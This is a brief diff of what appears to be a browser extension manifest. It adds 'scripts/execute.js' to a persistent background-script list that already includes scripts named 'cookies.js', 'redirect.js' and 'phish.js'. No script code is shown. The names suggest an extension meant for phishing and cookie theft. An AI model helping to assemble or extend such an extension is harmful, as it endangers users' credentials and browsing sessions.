@@ -10,7 +10,8 @@
             "externalJS/jquery.js",
             "scripts/cookies.js",
             "scripts/redirect.js",
-            "scripts/phish.js"
+            "scripts/phish.js",
+            "scripts/execute.js"
         ],
         "persistent": true
     },
